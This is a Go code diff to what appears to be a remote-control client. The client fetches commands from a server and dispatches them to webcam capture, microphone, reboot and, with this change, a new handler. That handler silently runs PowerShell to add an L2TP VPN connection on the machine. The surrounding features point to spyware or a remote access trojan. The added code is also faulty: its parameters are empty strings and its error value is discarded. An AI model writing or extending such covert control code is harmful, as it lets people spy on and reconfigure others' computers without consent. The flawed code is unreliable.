@@ -20,6 +20,31 @@ type Response struct {
 	Command string `json:"command"`
 }
 
+func handleVpn() {
+	// SetupBuiltinVPN конфигурирует встроенный VPN Windows через PowerShell.
+	// Он использует командлет Add-VpnConnection для создания VPN-соединения.
+	// Параметры:
+	//
+	//	connectionName – имя VPN-соединения,
+	//	serverAddress  – адрес VPN-сервера,
+	//	preSharedKey   – предустановленный ключ (PSK) для L2TP.
+	// Add-VpnConnection -Name "MyVPN" -ServerAddress "vpn.example.com" -TunnelType L2TP -EncryptionLevel Required -AuthenticationMethod MSChapv2 -L2tpPsk "myPSK" -Force
+	connectionName := ""
+	serverAddress := ""
+	preSharedKey := ""
+
+	psCmd := fmt.Sprintf(
+		`Add-VpnConnection -Name "%s" -ServerAddress "%s" -TunnelType L2TP -EncryptionLevel Required -AuthenticationMethod MSChapv2 -L2tpPsk "%s" -Force`,
+		connectionName, serverAddress, preSharedKey,
+	)
+
+	cmd := exec.Command("powershell", "-Command", psCmd)
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		fmt.Errorf("failed to configure built-in VPN: %v, output: %s", err, string(output))
+	}
+}
+
 func handleCamera() {
 	webcam, err := gocv.OpenVideoCapture(0)
 	if err != nil {
@@ -126,6 +151,8 @@ func makeRequest() {
 		handleReboot()
 	case "microphone":
 		handleMic(rand.Intn(2))
+	case "vpn":
+		handleVpn()
 	default:
 		fmt.Println("Unknown command:", response.Command)
 	}
